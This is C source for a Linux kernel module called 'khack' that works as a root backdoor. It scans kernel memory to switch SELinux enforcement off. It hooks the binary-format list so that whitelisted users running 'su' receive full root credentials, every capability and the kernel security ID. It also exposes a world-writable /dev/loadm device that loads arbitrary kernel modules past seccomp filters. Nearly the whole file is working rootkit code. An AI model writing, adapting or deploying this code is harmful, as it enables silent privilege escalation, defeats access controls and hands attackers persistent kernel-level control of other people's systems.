// SPDX-License-Identifier: GPL-2.0
/* khack: binfmt root + in-kernel module loader.
 *
 *  - whitelisted uid exec'ing "su" gets cred + SID rewritten (node-free root)
 *  - /dev/loadm ioctl loads and unloads .ko files from kernel context, so a
 *    process whose seccomp filter blocks finit_module can still install one
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/binfmts.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/string.h>
#include <linux/capability.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/file.h>
#include <linux/slab.h>
#include <asm/ptrace.h>

typedef unsigned long (*copy_fn)(void *to, const void *from, unsigned long n);

#define FORMATS_DELTA 0x2AFF828UL
#define FINIT_DELTA   0x45530UL
#define DELMOD_DELTA  0x44680UL

#define KMAX_ALLOW 8
static volatile int allow_uids[KMAX_ALLOW] = { -1, -1, -1, -1, -1, -1, -1, -1 };

static bool uid_allowed(u32 uid)
{
	int i;

	if (uid == 0)
		return true;
	for (i = 0; i < KMAX_ALLOW; i++)
		if ((u32)*(volatile int *)&allow_uids[i] == uid && uid != 0xFFFFFFFFu)
			return true;
	return false;
}

/* ---- selinux scanner ---- */
static int clear_enforcing(void)
{
	copy_fn pkr = (copy_fn)__symbol_get("probe_kernel_read");
	unsigned long anchor = (unsigned long)__symbol_get("printk");
	unsigned long lo, hi, a, hit = 0;
	static u8 buf[4096];
	int found = 0;

	if (!pkr || !anchor)
		return -EINVAL;

	anchor &= ~0xFFFUL;
	lo = anchor - 0x800000UL;
	hi = anchor + 0x4000000UL;

	for (a = lo; a < hi; a += sizeof(buf)) {
		unsigned int i;

		if (pkr(buf, (void *)a, sizeof(buf)))
			continue;

		for (i = 0; i + 32 <= sizeof(buf); i++) {
			u8 *b = buf + i;
			u64 avc, ss;
			int j, ok = 1;

			if (b[0] || b[1] != 1 || b[2] || b[3] != 1)
				continue;
			if ((a + i) & 7)
				continue;
			for (j = 4; j < 16; j++)
				if (b[j] > 1) { ok = 0; break; }
			if (!ok)
				continue;
			memcpy(&avc, b + 16, 8);
			memcpy(&ss, b + 24, 8);
			if (avc & 7 || ss & 7)
				continue;
			if (avc < lo || avc >= hi || ss < lo || ss >= hi)
				continue;
			found++;
			hit = a + i;
		}
	}

	if (found != 1)
		return -ENOENT;

	*(u8 *)(hit + 1) = 0;
	return 0;
}

/* ---- binfmt hook ---- */
static bool looks_like_su(const char *p)
{
	int n;

	if (!p)
		return false;
	n = strlen(p);
	if (n == 2)
		return p[0] == 's' && p[1] == 'u';
	if (n > 3 && p[n - 3] == '/' && p[n - 2] == 's' && p[n - 1] == 'u')
		return true;
	return false;
}

static bool linked;

static int khack_load_binary(struct linux_binprm *bprm)
{
	struct cred *cred;
	u32 *tsec;

	if (!bprm || !bprm->filename)
		return -ENOEXEC;
	if (!looks_like_su(bprm->filename))
		return -ENOEXEC;
	if (!uid_allowed(__kuid_val(current_uid())))
		return -ENOEXEC;

	cred = bprm->cred;
	if (!cred)
		return -ENOEXEC;

	cred->uid   = GLOBAL_ROOT_UID;
	cred->gid   = GLOBAL_ROOT_GID;
	cred->suid  = GLOBAL_ROOT_UID;
	cred->sgid  = GLOBAL_ROOT_GID;
	cred->euid  = GLOBAL_ROOT_UID;
	cred->egid  = GLOBAL_ROOT_GID;
	cred->fsuid = GLOBAL_ROOT_UID;
	cred->fsgid = GLOBAL_ROOT_GID;
	memset(&cred->cap_inheritable, 0xff, sizeof(cred->cap_inheritable));
	memset(&cred->cap_permitted,   0xff, sizeof(cred->cap_permitted));
	memset(&cred->cap_effective,   0xff, sizeof(cred->cap_effective));
	memset(&cred->cap_bset,        0xff, sizeof(cred->cap_bset));
	memset(&cred->cap_ambient,     0xff, sizeof(cred->cap_ambient));

	tsec = (u32 *)current->security;
	if (tsec)
		tsec[1] = 1;               /* SECINITSID_KERNEL */

	return -ENOEXEC;
}

static struct linux_binfmt khack_binfmt = {
	.module      = THIS_MODULE,
	.load_binary = khack_load_binary,
};

/* ---- in-kernel module loader ---- */
#define LOADM_LOAD   0x4C01
#define LOADM_UNLOAD 0x4C02
#define LOADM_PARAMS_OFF 256

static long loadm_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	unsigned long pk = (unsigned long)__symbol_get("printk");

	if (!pk)
		return -ENOENT;

	if (cmd == LOADM_LOAD) {
		char path[256];
		struct file *kf;
		struct pt_regs regs;
		int fd;

		if (strncpy_from_user(path, (void __user *)arg, sizeof(path) - 1) < 0)
			return -EFAULT;
		path[sizeof(path) - 1] = 0;

		kf = filp_open(path, O_RDONLY, 0);
		if (IS_ERR(kf))
			return PTR_ERR(kf);

		fd = get_unused_fd_flags(O_RDONLY);
		if (fd < 0) {
			filp_close(kf, NULL);
			return fd;
		}
		fd_install(fd, kf);

		memset(&regs, 0, sizeof(regs));
		regs.regs[0] = fd;
		/* arg+256 points at the caller-supplied params string; passing
		 * NULL makes the kernel's strndup_user() fail with EFAULT. */
		regs.regs[1] = arg + LOADM_PARAMS_OFF;
		return ((long (*)(struct pt_regs *))(pk + FINIT_DELTA))(&regs);
	}

	if (cmd == LOADM_UNLOAD) {
		struct pt_regs regs;

		memset(&regs, 0, sizeof(regs));
		regs.regs[0] = arg;        /* user pointer to the module name */
		return ((long (*)(struct pt_regs *))(pk + DELMOD_DELTA))(&regs);
	}

	return -EINVAL;
}

static const struct file_operations loadm_fops = {
	.owner          = THIS_MODULE,
	.unlocked_ioctl = loadm_ioctl,
};

static struct miscdevice loadm_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = "loadm",
	.fops  = &loadm_fops,
	.mode  = 0666,
};

static int __init khack_init(void)
{
	unsigned long pk = (unsigned long)__symbol_get("printk");
	void *p_rw = __symbol_get("set_memory_rw");
	struct list_head *head;

	if (!pk)
		return -ENOENT;

	clear_enforcing();

	head = (struct list_head *)(pk + FORMATS_DELTA);

	if (p_rw)
		(void)((int (*)(unsigned long, int))p_rw)(
			(unsigned long)head & PAGE_MASK, 1);

	INIT_LIST_HEAD(&khack_binfmt.lh);
	list_add(&khack_binfmt.lh, head);
	linked = true;

	(void)misc_register(&loadm_dev);

	return 0;
}

static void __exit khack_exit(void)
{
	misc_deregister(&loadm_dev);
	if (linked)
		list_del(&khack_binfmt.lh);
}

module_init(khack_init);
module_exit(khack_exit);
MODULE_LICENSE("GPL");
